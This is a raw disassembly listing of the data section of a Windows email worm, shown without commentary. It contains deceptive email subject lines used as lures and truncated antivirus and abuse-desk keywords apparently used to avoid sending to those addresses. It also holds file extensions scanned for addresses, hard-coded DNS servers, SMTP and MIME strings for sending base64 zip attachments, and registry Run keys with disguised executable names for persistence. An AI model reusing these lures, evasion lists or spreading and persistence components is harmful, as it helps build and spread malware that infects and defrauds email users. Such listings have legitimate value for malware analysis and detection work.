aPleaseReply	db 'please reply ',0    ; DATA XREF: C:00408284o
		align 4
aPleaseRead	db 'please read',0      ; DATA XREF: C:00408280o
aReadThisMessag	db 'Read this message',0 ; DATA XREF: C:0040827Co
		align 4
aAutomaticRespo	db 'automatic responder',0 ; DATA XREF: C:00408278o
aExpiredAccount	db 'Expired account ',0 ; DATA XREF: C:00408274o
		align 10h
aAutomaticNotif	db 'automatic notification',0 ; DATA XREF: C:00408270o
		align 4
aYouHave1DayLef	db 'You have 1 day left',0 ; DATA XREF: C:00408268o
aSchedule	db 'Schedule',0         ; DATA XREF: C:00408264o
		align 4
aAttention	db 'Attention',0        ; DATA XREF: C:00408260o
		align 4
aReadNow	db 'read now!',0        ; DATA XREF: C:0040825Co
		align 10h
aYourRequestWas	db 'Your request was registered',0 ; DATA XREF: C:00408258o
aRegistered?	db 'registered?',0      ; DATA XREF: C:00408254o
aReCensored	db 'Re: <censored>',0   ; DATA XREF: C:00408250o
		align 4
aLoveIs		db 'Love is ',0         ; DATA XREF: C:0040824Co
		align 4
aYourIpWasLogge	db 'Your IP was logged',0 ; DATA XREF: C:00408248o
		align 4
aYouUseIllegal_	db 'You use illegal...',0 ; DATA XREF: C:00408244o
		align 4
aThankYouVeryVe	db 'Thank You very very much',0 ; DATA XREF: C:00408240o
		align 4
aHiItSMe	db 'hi, it',27h,'s me',0 ; DATA XREF: C:0040823Co
aApproved	db 'Approved',0         ; DATA XREF: C:00408238o
		align 10h
aReApproved	db 'Re: Approved',0     ; DATA XREF: C:00408234o
		align 10h
aDetails	db 'Details',0          ; DATA XREF: C:00408230o
aThankYou	db 'Thank you',0        ; DATA XREF: C:0040822Co
		align 4
aReDetails	db 'Re: Details',0      ; DATA XREF: C:00408228o
aReThankYou	db 'Re: Thank you',0    ; DATA XREF: C:00408224o
		align 10h
aAnnouncement	db 'Announcement',0     ; DATA XREF: C:00408220o
		align 10h
aOh		db 'oh',0               ; DATA XREF: C:0040821Co
		align 4
aNotice		db 'notice!',0          ; DATA XREF: C:00408214o
aItsMe		db 'its me',0           ; DATA XREF: C:00408210o
		align 4
aIMBack		db 'I',27h,'m back!',0  ; DATA XREF: C:0040820Co
		align 10h
aLastChance	db 'last chance!',0     ; DATA XREF: C:00408208o
		align 10h
aLol_0		db 'lol',0              ; DATA XREF: C:00408204o
aRe5664ddff???z	db 'Re: <5664ddff?$??§2>',0 ; DATA XREF: C:00408200o
		align 4
aNotification	db 'notification',0     ; DATA XREF: C:004081FCo
		align 4
aDenied		db 'denied!',0          ; DATA XREF: C:004081F8o
aQuestion_0	db 'Question',0         ; DATA XREF: C:004081F4o
		align 10h
aBelieveMe	db 'believe me',0       ; DATA XREF: C:004081F0o
		align 4
aReHello	db 'Re: hello',0        ; DATA XREF: C:004081ECo
		align 4
aReImportant	db 'Re: important',0    ; DATA XREF: C:004081E8o
		align 4
aReHi		db 'Re: hi',0           ; DATA XREF: C:004081E0o
		align 10h
aExcuseMe	db 'excuse me',0        ; DATA XREF: C:004081DCo
		align 4
aReHey		db 'Re: hey',0          ; DATA XREF: C:004081D8o
aException	db 'exception',0        ; DATA XREF: C:004081D4o
		align 10h
aSomethingForYo	db 'something for you',0 ; DATA XREF: C:004081D0o
		align 4
aYou?		db 'you?',0             ; DATA XREF: C:004081CCo
		align 4
aReReReRe	db 'Re: Re: Re: Re:',0  ; DATA XREF: C:004081C8o
aRe		db 're:',0              ; DATA XREF: C:004081C4o
aTakeIt		db 'take it',0          ; DATA XREF: C:004081C0o
aError		db 'error',0            ; DATA XREF: C:004081BCo
		align 10h
aIllegal___	db 'illegal...',0       ; DATA XREF: C:004081B8o
		align 4
aGoodMorning	db 'good morning',0     ; DATA XREF: C:004081B4o
		align 4
aPrivate?	db 'private?',0         ; DATA XREF: C:004081B0o
		align 4
aStolen		db 'stolen',0           ; DATA XREF: C:004081ACo
		align 10h
aHereIsIt	db 'Here is it',0       ; DATA XREF: C:004081A8o
		align 4
aReInformation	db 'Re: information',0  ; DATA XREF: C:004081A4o C:0040826Co
aInfo		db 'info',0             ; DATA XREF: C:004081A0o
		align 4
aWhatSUp?	db 'what',27h,'s up?',0 ; DATA XREF: C:0040819Co
		align 10h
aMoin		db 'moin',0             ; DATA XREF: C:00408198o
		align 4
aWarning	db 'warning',0          ; DATA XREF: C:00408194o
aFake?		db 'fake?',0            ; DATA XREF: C:00408190o
		align 4
aReUnknown	db 'Re: unknown',0      ; DATA XREF: C:0040818Co
aDear		db 'dear',0             ; DATA XREF: C:00408188o
		align 4
aHello		db 'hello',0            ; DATA XREF: C:00408184o
		align 4
aImportant	db 'important',0        ; DATA XREF: C:00408180o C:00408744o
		align 10h
aYep		db 'Yep',0              ; DATA XREF: C:0040817Co
aReDoesIt?	db 'Re: does it?',0     ; DATA XREF: C:00408178o C:004081E4o
		align 4
aHi		db 'hi',0               ; DATA XREF: C:00408174o
		align 4
aReadItImmediat	db 'read it immediatelly',0 ; DATA XREF: C:00408170o
		align 10h
aReExcuseMe	db 'Re: excuse me',0    ; DATA XREF: C:0040816Co
		align 10h
aHey		db 'hey',0              ; DATA XREF: C:00408168o
aTrustMe	db 'trust me',0         ; DATA XREF: C:00408164o
		align 10h
aQuestion	db 'question',0         ; DATA XREF: C:00408160o
		align 4
aReport		db 'report',0           ; DATA XREF: C:0040815Co
		align 4
aStatus		db 'Status',0           ; DATA XREF: C:00408158o
		align 4
aDeliveryFailed	db 'Delivery Failed',0
aSkynet		db 'skynet',0           ; DATA XREF: C:00408150o
		align 4
aMessagelabs	db 'messagelabs',0      ; DATA XREF: C:0040814Co
aAbuse		db 'abuse',0            ; DATA XREF: C:00408148o
		align 4
aFbi		db 'fbi',0              ; DATA XREF: C:00408144o
aOrton		db 'orton',0            ; DATA XREF: C:00408140o
		align 4
aFPro		db 'f-pro',0            ; DATA XREF: C:0040813Co
		align 4
aAspersky	db 'aspersky',0         ; DATA XREF: C:00408138o
		align 4
aCafee		db 'cafee',0            ; DATA XREF: C:00408134o
		align 10h
aOrman		db 'orman',0            ; DATA XREF: C:00408130o
		align 4
aItdefender	db 'itdefender',0       ; DATA XREF: C:0040812Co
		align 4
aFSecur		db 'f-secur',0          ; DATA XREF: C:00408128o
aAvp		db 'avp',0              ; DATA XREF: C:00408124o
aSpam		db 'spam',0             ; DATA XREF: C:00408120o
		align 4
aYmantec	db 'ymantec',0          ; DATA XREF: C:0040811Co
aAntivi		db 'antivi',0           ; DATA XREF: C:00408118o
		align 4
aIcrosoft	db 'icrosoft',0         ; DATA XREF: C:off_408114o
		align 4
aBeAwareSkynet_	db 'be aware! Skynet.cz - -->AntiHacker Crew<--',0 ; DATA XREF: C:00408110o
a0123456789	db '0123456789',0       ; DATA XREF: C:0040810Co
		align 4
a_dhtm		db '.dhtm',0            ; DATA XREF: C:00408108o
		align 4
a_cgi		db '.cgi',0             ; DATA XREF: C:00408104o
		align 4
a_shtm		db '.shtm',0            ; DATA XREF: C:00408100o
		align 4
; char a_msg[]
a_msg		db '.msg',0             ; DATA XREF: sub_402A51+128o
					; C:004080FCo
		align 4
; char a_oft[]
a_oft		db '.oft',0             ; DATA XREF: sub_402A51+13Bo
					; C:004080F8o
		align 4
; char a_sht[]
a_sht		db '.sht',0             ; DATA XREF: sub_402A51+D0o
					; C:004080F4o
		align 4
; char a_dbx[]
a_dbx		db '.dbx',0             ; DATA XREF: sub_402A51+161o
					; C:004080F0o
		align 4
; char a_tbb[]
a_tbb		db '.tbb',0             ; DATA XREF: sub_402A51+E7o
					; C:004080ECo
		align 4
; char a_adb[]
a_adb		db '.adb',0             ; DATA XREF: sub_402A51+FEo
					; C:004080E8o
		align 4
; char a_doc[]
a_doc		db '.doc',0             ; DATA XREF: sub_402A51+14Eo
					; C:004080E4o ...
		align 4
; char a_wab[]
a_wab		db '.wab',0             ; DATA XREF: sub_402A51+115o
					; C:004080E0o
		align 4
a_asp		db '.asp',0             ; DATA XREF: C:004080DCo
		align 4
a_uin		db '.uin',0             ; DATA XREF: C:004080D8o
		align 4
a_rtf		db '.rtf',0             ; DATA XREF: C:004080D4o C:0040885Co
		align 4
a_vbs		db '.vbs',0             ; DATA XREF: C:004080D0o
		align 4
a_html		db '.html',0            ; DATA XREF: C:004080CCo
		align 4
a_htm		db '.htm',0             ; DATA XREF: C:004080C8o C:00408864o
		align 4
a_pl		db '.pl',0              ; DATA XREF: C:004080C4o
a_php		db '.php',0             ; DATA XREF: C:004080C0o
		align 10h
a_txt		db '.txt',0             ; DATA XREF: C:004080BCo C:off_408858o
		align 4
a_eml		db '.eml',0             ; DATA XREF: C:off_4080B8o
		align 10h
a__2		db '.[]-',0             ; DATA XREF: C:004080B4o
		align 4
a@:					; DATA XREF: C:004080B0o
		unicode	0, <@>,0
a__		db '._-\/',0            ; DATA XREF: C:off_4080ACo
		align 4
a212_44_160_8	db '212.44.160.8',0     ; DATA XREF: C:00408090o
		align 4
a195_185_185_19	db '195.185.185.195',0  ; DATA XREF: C:00408088o C:0040808Co
a151_189_13_35	db '151.189.13.35',0    ; DATA XREF: C:00408084o
		align 4
a213_191_74_19	db '213.191.74.19',0    ; DATA XREF: C:00408080o
		align 4
a193_189_244_20	db '193.189.244.205',0  ; DATA XREF: C:0040807Co
a145_253_2_171	db '145.253.2.171',0    ; DATA XREF: C:00408078o
		align 4
a193_141_40_42	db '193.141.40.42',0    ; DATA XREF: C:00408074o
		align 4
a194_25_2_134	db '194.25.2.134',0     ; DATA XREF: C:00408070o
		align 4
a194_25_2_133	db '194.25.2.133',0     ; DATA XREF: C:0040806Co
		align 4
a194_25_2_132	db '194.25.2.132',0     ; DATA XREF: C:00408068o
		align 4
a194_25_2_131	db '194.25.2.131',0     ; DATA XREF: C:00408064o
		align 4
a193_193_158_10	db '193.193.158.10',0   ; DATA XREF: C:00408060o
		align 4
a212_7_128_165	db '212.7.128.165',0    ; DATA XREF: C:0040805Co
		align 4
a212_7_128_162	db '212.7.128.162',0    ; DATA XREF: C:00408058o
		align 4
a193_193_144_12	db '193.193.144.12',0   ; DATA XREF: C:00408054o
		align 4
a217_5_97_137	db '217.5.97.137',0     ; DATA XREF: C:0040804Co
		align 4
a195_20_224_234	db '195.20.224.234',0   ; DATA XREF: C:00408048o
		align 4
a194_25_2_130	db '194.25.2.130',0     ; DATA XREF: C:00408044o
		align 4
a194_25_2_129	db '194.25.2.129',0     ; DATA XREF: C:00408040o C:00408050o
		align 4
a212_185_252_13	db '212.185.252.136',0  ; DATA XREF: C:0040803Co
a212_185_253_70	db '212.185.253.70',0   ; DATA XREF: C:00408038o
		align 4
a212_185_252_73	db '212.185.252.73',0   ; DATA XREF: C:00408034o
		align 4
a62_155_255_16	db '62.155.255.16',0    ; DATA XREF: C:off_408030o
		align 4
; char name[]
name		db 'nameserver',0       ; DATA XREF: sub_4010A4+56o
		align 10h
; char proto[]
proto		db 'UDP',0              ; DATA XREF: sub_4010A4:loc_4010F5o
; char aSUSU_2u_2u_2uS[]
aSUSU_2u_2u_2uS	db '%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u',0 ; DATA XREF: sub_401B67+136o
		align 4
asc_40A89C:				; DATA XREF: sub_401B67+F6o
		unicode	0, <->,0
asc_40A8A0:				; DATA XREF: sub_401B67+EFo
		unicode	0, <+>,0
aDec		db 'Dec',0              ; DATA XREF: sub_401B67+8Bo
aNov		db 'Nov',0              ; DATA XREF: sub_401B67+84o
aOct		db 'Oct',0              ; DATA XREF: sub_401B67+7Do
aSep		db 'Sep',0              ; DATA XREF: sub_401B67+76o
aAug		db 'Aug',0              ; DATA XREF: sub_401B67+6Fo
aJul		db 'Jul',0              ; DATA XREF: sub_401B67+68o
aJun		db 'Jun',0              ; DATA XREF: sub_401B67+61o
aMay		db 'May',0              ; DATA XREF: sub_401B67+5Ao
aApr		db 'Apr',0              ; DATA XREF: sub_401B67+53o
aMar		db 'Mar',0              ; DATA XREF: sub_401B67+4Co
aFeb		db 'Feb',0              ; DATA XREF: sub_401B67+45o
aJan		db 'Jan',0              ; DATA XREF: sub_401B67+3Eo
aSat		db 'Sat',0              ; DATA XREF: sub_401B67+37o
aFri		db 'Fri',0              ; DATA XREF: sub_401B67+30o
aThu		db 'Thu',0              ; DATA XREF: sub_401B67+29o
aWed		db 'Wed',0              ; DATA XREF: sub_401B67+22o
aTue		db 'Tue',0              ; DATA XREF: sub_401B67+1Bo
aMon		db 'Mon',0              ; DATA XREF: sub_401B67+14o
aSun		db 'Sun',0              ; DATA XREF: sub_401B67+Co
; char buf[]
buf		db 0Dh,0Ah,0		; DATA XREF: sub_401CB2+95o
					; sub_401E62+1C6o
		align 4
; char aQuit[]
aQuit		db 'QUIT',0Dh,0Ah,0     ; DATA XREF: sub_401E62+8CCo
		align 4
; char a__0[]
a__0		db 0Dh,0Ah		; DATA XREF: sub_401E62+89Do
		db '.',0Dh,0Ah,0
		align 4
; char asc_40A904[]
asc_40A904	db '--',0Dh,0Ah         ; DATA XREF: sub_401E62+879o
		db 0Dh,0Ah,0
		align 4
; char asc_40A90C[]
asc_40A90C	db 0Dh,0Ah		; DATA XREF: sub_401E62+855o
		db 0Dh,0Ah
		db '--',0
		align 4
; char asc_40A914[]
asc_40A914	db '"',0Dh,0Ah          ; DATA XREF: sub_401E62+7DAo
		db 0Dh,0Ah,0
		align 4
; char aContentTransfe[]
aContentTransfe	db '"',0Dh,0Ah          ; DATA XREF: sub_401E62+7B6o
		db 'Content-Transfer-Encoding: base64',0Dh,0Ah
		db 'Content-Disposition: attachment;',0Dh,0Ah
		db 9,'filename="',0
; char asc_40A970[]
asc_40A970	db 0Dh,0Ah		; DATA XREF: sub_401E62+76Co
		db 0Dh,0Ah,0
		align 4
; char aContentTypeTex[]
aContentTypeTex	db 'Content-Type: text/plain;',0Dh,0Ah ; DATA XREF: sub_401E62+718o
		db 9,'charset="Windows-1252"',0Dh,0Ah
		db 'Content-Transfer-Encoding: 7bit',0Dh,0Ah
		db 0Dh,0Ah,0
; char asc_40A9D0[]
asc_40A9D0	db '--',0               ; DATA XREF: sub_401E62+6D4o
		align 4
; char aThisIsAMultiPa[]
aThisIsAMultiPa	db 'This is a multi-part message in MIME format.',0Dh,0Ah
					; DATA XREF: sub_401E62+6A5o
		db 0Dh,0Ah,0
		align 4
; char aXMsmailPriorit[]
aXMsmailPriorit	db 'X-MSMail-Priority: Normal',0Dh,0Ah ; DATA XREF: sub_401E62+691o
		db 0Dh,0Ah,0
		align 4
; char aXPriority3[]
aXPriority3	db 'X-Priority: 3',0Dh,0Ah,0 ; DATA XREF: sub_401E62+680o
; char asc_40AA38[]
asc_40AA38	db '"',0Dh,0Ah,0        ; DATA XREF: sub_401E62+66Fo
; char aContentTypeMul[]
aContentTypeMul	db 'Content-Type: multipart/mixed;',0Dh,0Ah ; DATA XREF: sub_401E62+645o
		db 9,'boundary="',0
; char a_nextpart__3u_[]
a_nextpart__3u_	db '----=_NextPart_%.3u_%.4u_%.8X.%.8X',0 ; DATA XREF: sub_401E62+639o
		align 4
; char aMimeVersion1_0[]
aMimeVersion1_0	db 0Dh,0Ah		; DATA XREF: sub_401E62+5E9o
		db 'MIME-Version: 1.0',0Dh,0Ah,0
		align 4
; char aDate[]
aDate		db 'Date: ',0           ; DATA XREF: sub_401E62+5B9o
		align 4
; char aSubject[]
aSubject	db 'Subject: ',0        ; DATA XREF: sub_401E62+589o
		align 4
; char aTo[]
aTo		db 'To: ',0             ; DATA XREF: sub_401E62+55Co
		align 10h
; char aFrom[]
aFrom		db 'From: ',0           ; DATA XREF: sub_401E62+52Fo
		align 4
; char aContentTypeA_0[]
aContentTypeA_0	db 'Content-Type: application/octet-stream;',0Dh,0Ah
					; DATA XREF: sub_401E62+51Co
		db 9,'name="',0
		align 4
; char aContentTypeApp[]
aContentTypeApp	db 'Content-Type: application/x-zip-compressed;',0Dh,0Ah
					; DATA XREF: sub_401E62+4A2o
		db 9,'name="',0
		align 4
; char a_zip[]
a_zip		db '.zip',0             ; DATA XREF: sub_401E62+451o
		align 4
; char asc_40AB3C[]
asc_40AB3C:				; DATA XREF: sub_401E62+3DBo
					; sub_402C58+9Ao ...
		unicode	0, <\>,0
; char a_[]
a_:					; DATA XREF: sub_401E62+375o
		unicode	0, <_>,0
; char aData[]
aData		db 'DATA',0Dh,0Ah,0     ; DATA XREF: sub_401E62+2FCo
		align 4
; char aRcptTo[]
aRcptTo		db 'RCPT TO: <',0       ; DATA XREF: sub_401E62+2A9o
		align 4
; char asc_40AB58[]
asc_40AB58	db '>',0Dh,0Ah,0        ; DATA XREF: sub_401E62+26Bo
; char aMailFrom[]
aMailFrom	db 'MAIL FROM: <',0     ; DATA XREF: sub_401E62+253o
		align 4
; char aHelo[]
aHelo		db 'HELO ',0            ; DATA XREF: sub_401E62+1FCo
		align 4
; char aEhlo[]
aEhlo		db 'EHLO ',0            ; DATA XREF: sub_401E62+1A8o
		align 4
; char a__1[]
a__1		db '\*.*',0             ; DATA XREF: sub_402C58+1Fo
		align 4
aWindowsService	db 'Windows Services Host',0 ; DATA XREF: sub_402DDF+1C5o
					; sub_402DDF+1D1o
		align 4
; char aSystemCurrentc[]
aSystemCurrentc	db 'System\CurrentControlSet\Services\WksPatch ',0
					; DATA XREF: sub_402DDF+1B9o
; char aSoftwareMicr_1[]
aSoftwareMicr_1	db 'Software\Microsoft\Windows\CurrentVersion\Explorer\PINF',0
					; DATA XREF: sub_402DDF+1ADo
aSentry		db 'Sentry',0           ; DATA XREF: sub_402DDF+19Eo
		align 4
aOle		db 'OLE',0              ; DATA XREF: sub_402DDF+192o
aService	db 'service',0          ; DATA XREF: sub_402DDF+186o
aAu_exe		db 'au.exe',0           ; DATA XREF: sub_402DDF+17Ao
		align 4
aD3dupdate_exe	db 'd3dupdate.exe',0    ; DATA XREF: sub_402DDF+16Eo
		align 4
aDeleteMe	db 'DELETE ME',0        ; DATA XREF: sub_402DDF+15Fo
		align 4
aMsgsvr32	db 'msgsvr32',0         ; DATA XREF: sub_402DDF+153o
		align 4
aSoftwareMicr_0	db 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',0
					; DATA XREF: sub_402DDF+148o
		align 4
aSystem_	db 'system.',0          ; DATA XREF: sub_402DDF+137o
					; sub_402DDF+143o
aKasperskyav	db 'KasperskyAv',0      ; DATA XREF: sub_402DDF+11Fo
					; sub_402DDF+12Bo
; char aClsidE6fb5e20D[]
aClsidE6fb5e20D	db 'CLSID\{E6FB5E20-DE35-11CF-9C87-00AA005127ED}\InProcServer32',0
					; DATA XREF: sub_402DDF+10Fo
aExplorer	db 'Explorer',0         ; DATA XREF: sub_402DDF+F4o
					; sub_402DDF+100o
		align 4
aTaskmon	db 'Taskmon',0          ; DATA XREF: sub_402DDF+DAo
; char ValueName[]
ValueName	db 'ICQ Net',0          ; DATA XREF: sub_402DDF+C3o
; char SubKey[]
SubKey		db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
					; DATA XREF: sub_402DDF+98o
		align 4
; char aStealth[]
aStealth	db ' -stealth',0        ; DATA XREF: sub_402DDF+88o
		align 4
; char aWinlogon_exe[]
aWinlogon_exe	db 'winlogon.exe',0     ; DATA XREF: sub_402DDF+60o
		align 4
; char aSkoorpio@yahoo[]
aSkoorpio@yahoo	db 'skoorpio@yahoo.com',0 ; DATA XREF: WinMain(x,x,x,x)+67o
		align 10h
off_40AD50	dd offset __exit	; DATA XREF: __amsg_exit+1Cr
dword_40AD54	dd 2			; DATA XREF: __FF_MSGBANNER+Er
					; __NMSG_WRITE+46r
dword_40AD58	dd 1			; DATA XREF: __dosmaperr+Co
dword_40AD5C	dd 16h			; DATA XREF: __dosmaperr:loc_403C2Cr
		dd 2 dup(2), 3,	2, 4, 18h, 5, 0Dh, 6, 9, 7, 0Ch, 8, 0Ch
		dd 9, 0Ch, 0Ah,	7, 0Bh,	8, 0Ch,	16h, 0Dh, 16h, 0Fh, 2
		dd 10h,	0Dh, 11h, 2 dup(12h), 2, 21h, 0Dh, 35h,	2, 41h
		dd 0Dh,	43h, 2,	50h, 11h, 52h, 0Dh, 53h, 0Dh, 57h, 16h
		dd 59h,	0Bh, 6Ch, 0Dh, 6Dh, 20h, 70h, 1Ch, 72h,	9, 6, 16h
		dd 80h,	0Ah, 81h, 0Ah, 82h, 9, 83h, 16h, 84h, 0Dh, 91h
		dd 29h,	9Eh, 0Dh, 0A1h,	2, 0A4h, 0Bh, 0A7h, 0Dh, 0B7h
		dd 11h,	0CEh, 2, 0D7h, 0Bh, 718h, 0Ch
dword_40AEC0	dd 40AECAh		; DATA XREF: _isdigit+1Br
					; __dosmaperr+19o ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		retf	40AEh
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		public __ctype
; unsigned __int16 _ctype[]
__ctype		dd    200000h		; DATA XREF: _x_ismbbtype+18r
		unicode	0, <	    (((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(810081h), 0Ah dup(10001h), 3 dup(100010h), 3 dup(820082h)
		dd 0Ah dup(20002h), 2 dup(100010h), 20h, 40h dup(0)
dword_40B0CC	dd 1			; DATA XREF: _isdigitr
		dd 2Eh,	1
dword_40B0D8	dd 0C0000005h		; DATA XREF: _xcptlookup+Ar
					; _xcptlookup+11o
		dd 0Bh,	0, 0C000001Dh, 4, 0, 0C0000096h, 4, 0, 0C000008Dh
		dd 8, 0, 0C000008Eh, 8,	0, 0C000008Fh, 8, 0, 0C0000090h
		dd 8, 0, 0C0000091h, 8,	0, 0C0000092h, 8, 0, 0C0000093h
		dd 8, 0
dword_40B150	dd 3			; DATA XREF: __XcptFilter+58r
dword_40B154	dd 7			; DATA XREF: __XcptFilter+5Er
dword_40B158	dd 0Ah			; DATA XREF: _xcptlookup+4r
dword_40B15C	dd 8Ch			; DATA XREF: __XcptFilter+82r
					; __XcptFilter+8Fw ...
		dd 0FFFFFFFFh, 0A00h, 10h
dword_40B16C	dd 19930520h, 4	dup(0)	; DATA XREF: A:004046CFo
					; __NLG_Notify+2o
dword_40B180	dd 2			; DATA XREF: __NMSG_WRITE+Eo
					; __NMSG_WRITE+28r
dword_40B184	dd 406844h		; DATA XREF: __NMSG_WRITE+FCr
					; __NMSG_WRITE+12Dr
		dd 8, 406818h, 9, 4067ECh, 0Ah,	4067C8h, 10h, 40679Ch
		dd 11h,	40676Ch, 12h, 406748h, 13h, 40671Ch, 18h, 4066E4h
		dd 19h,	4066BCh, 1Ah, 406684h, 1Bh, 40664Ch, 1Ch, 406624h
		dd 78h,	406614h, 79h, 406604h, 7Ah, 4065F4h, 0FCh, 40A8F0h
		dd 0FFh, 4065E4h
dword_40B210	dd 3F8h			; DATA XREF: __heap_alloc+5r
					; __NMSG_WRITE+1Bo
		align 8
byte_40B218	db 1			; DATA XREF: __setmbcp+E1r
		dd 80402h
		align 10h
dword_40B220	dd 3A4h			; DATA XREF: __setmbcp+2Fo
dword_40B224	dd 82798260h		; DATA XREF: __setmbcp+11Dr
		dd 21h,	0
dword_40B230	dd 0DFA6h		; DATA XREF: __setmbcp+C0r
		align 8
		dd 0A5A1h, 0, 0FCE09F81h, 0, 0FC807E40h, 0, 3A8h, 0A3DAA3C1h
		dd 20h,	5 dup(0), 0FE81h, 0, 0FE40h, 0,	3B5h, 0A3DAA3C1h
		dd 20h,	5 dup(0), 0FE81h, 0, 0FE41h, 0,	3B6h, 0A2E4A2CFh
		dd 0A2E5001Ah, 5BA2E8h,	4 dup(0), 0FE81h, 0, 0FEA17E40h
		dd 0, 551h, 0DA5EDA51h,	0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
dword_40B310	dd 0			; DATA XREF: sub_403038+41r
					; sub_403038+48r ...
		dd 3Bh dup(0)
		dd 9C4h	dup(?)
dword_40DB10	dd ?			; DATA XREF: sub_401E62+179r
					; sub_402821+37o ...
		dd 283Fh dup(?)
dword_417C10	dd ?			; DATA XREF: sub_401D73r
					; sub_401D73+10w ...
dword_417C14	dd ?			; DATA XREF: WinMain(x,x,x,x)+27w
dword_417C18	dd ?			; DATA XREF: sub_401E62+16Dr
					; sub_402821+25r ...
dword_417C1C	dd ?			; DATA XREF: C:00408218o C:00408590o
; const	CHAR word_417C20
word_417C20	dw ?			; DATA XREF: sub_4027B4+14o
					; sub_4028A4+BBr ...
		db 2 dup(?)
; char *dword_417C24
dword_417C24	dd ?			; DATA XREF: start+84w
					; __setenvp:loc_403FF2r ...
		dd ?
dword_417C2C	dd ?			; DATA XREF: __amsg_exitr
					; _fast_error_exitr ...
dword_417C30	dd ?			; DATA XREF: __dosmaperr+2Aw
					; __dosmaperr+3Cw ...
dword_417C34	dd ?			; DATA XREF: __dosmaperr+6w
		dd ?
dword_417C3C	dd ?			; DATA XREF: start+52w
dword_417C40	dd ?			; DATA XREF: start+49w
dword_417C44	dd ?			; DATA XREF: start+3Ew
dword_417C48	dd ?			; DATA XREF: start+30w
dword_417C4C	dd ?			; DATA XREF: __setargv+91w
dword_417C50	dd ?			; DATA XREF: __setargv+89w
		dd ?
dword_417C58	dd ?			; DATA XREF: __setenvp+44w
		dd 3 dup(?)
dword_417C68	dd ?			; DATA XREF: __setargv+2Ew
		dd ?
byte_417C70	db ?			; DATA XREF: _doexit+2Dw
		db 3 dup(?)
dword_417C74	dd ?			; DATA XREF: _doexit+27w
dword_417C78	dd ?			; DATA XREF: _doexit+4r _doexit+8Bw
dword_417C7C	dd ?			; DATA XREF: __XcptFilter+3Ar
					; __XcptFilter+46w ...
; char Filename[]
Filename	db 104h	dup(?)		; DATA XREF: __setargv:loc_4040B0o
dword_417D84	dd ?			; DATA XREF: ___crtGetEnvironmentStringsA+2r
					; ___crtGetEnvironmentStringsA+23w ...
dword_417D88	dd ?			; DATA XREF: __FF_MSGBANNER+21r
dword_417D8C	dd ?			; DATA XREF: _mallocr
dword_417D90	dd ?			; DATA XREF: __callnewhr
dword_417D94	dd ?			; DATA XREF: ___crtGetStringTypeA+26r
					; ___crtGetStringTypeA:loc_40522Aw
dword_417D98	dd ?			; DATA XREF: __setmbcp:loc_4054C6r
					; _getSystemCP+4w ...
dword_417D9C	dd ?			; DATA XREF: ___crtMessageBoxA+3r
					; ___crtMessageBoxA+2Ew ...
dword_417DA0	dd ?			; DATA XREF: ___crtMessageBoxA+43w
					; ___crtMessageBoxA:loc_40577Ar
dword_417DA4	dd ?			; DATA XREF: ___crtMessageBoxA+4Aw
					; ___crtMessageBoxA+60r
		dd 2 dup(?)
; LCID Locale
Locale		dd ?			; DATA XREF: ___crtGetStringTypeA+7Br
		dd 3 dup(?)
dword_417DC0	dd ?			; DATA XREF: ___crtGetStringTypeA+A6r
					; _getSystemCP+3Ar ...
		dd ?
dword_417DC8	dd ?			; DATA XREF: ___crtLCMapStringA+28r
					; ___crtLCMapStringA+4Cw ...
; UINT CodePage
CodePage	dd ?			; DATA XREF: __setmbcp+14r
					; __setmbcp+65w ...
dword_417DD0	dd 3 dup(?)		; DATA XREF: __setmbcp+123o
					; __setmbcp+171o ...
dword_417DDC	dd ?			; DATA XREF: __setmbcp+108w
					; __setmbcp+15Dw ...
byte_417DE0	db ?			; DATA XREF: _setSBUpLow:loc_405696w
					; _setSBUpLow:loc_4056B3w ...
		dd 3Fh dup(?)
		db 3 dup(?)
byte_417EE0	db ?			; DATA XREF: __setmbcp+5Co
					; __setmbcp+AFo ...
byte_417EE1	db ?			; DATA XREF: _parse_cmdline+3Fr
					; _parse_cmdline+84r ...
		dd 40h dup(?)
		db 2 dup(?)
dword_417FE4	dd ?			; DATA XREF: __setmbcp+6Ew
					; __setmbcp+12Bw ...
dword_417FE8	dd ?			; DATA XREF: ___sbh_heap_init+32w
					; ___sbh_alloc_new_region+5r ...
dword_417FEC	dd ?			; DATA XREF: ___sbh_free_block+239r
					; ___sbh_free_block+259r ...
dword_417FF0	dd ?			; DATA XREF: ___sbh_heap_init+2Dw
					; ___sbh_free_block+310w ...
dword_417FF4	dd ?			; DATA XREF: ___sbh_heap_init:loc_404994w
					; ___sbh_free_block+22Cr ...
dword_417FF8	dd ?			; DATA XREF: ___sbh_heap_init+24w
					; ___sbh_find_blockr ...
; LPVOID lpMem
lpMem		dd ?			; DATA XREF: ___sbh_heap_init+15w
					; ___sbh_find_block+8r	...
; HANDLE hHeap
hHeap		dd ?			; DATA XREF: __heap_alloc+28r
					; _free+21r ...
		dd 7 dup(?)
dword_418020	dd ?			; DATA XREF: __ioinit:loc_404438w
					; __ioinit+45r	...
dword_418024	dd 3Fh dup(?)		; DATA XREF: __ioinit+92o
; UINT uNumber
uNumber		dd ?			; DATA XREF: __ioinit+26w
					; __ioinit:loc_4044A2r	...
dword_418124	dd ?			; DATA XREF: __setenvp+ADw
dword_418128	dd ?			; DATA XREF: __wincmdlnr __setenvp+3r	...
dword_41812C	dd ?			; DATA XREF: _doexit+3Er
dword_418130	dd ?			; DATA XREF: _doexit+35r _doexit+57r
dword_418134	dd ?			; DATA XREF: __cinitr
dword_418138	dd ?			; DATA XREF: start+7Aw	__wincmdln+Fr ...
		dd 3B1h	dup(?)
C		ends

; Section 4. (virtual address 00019000)
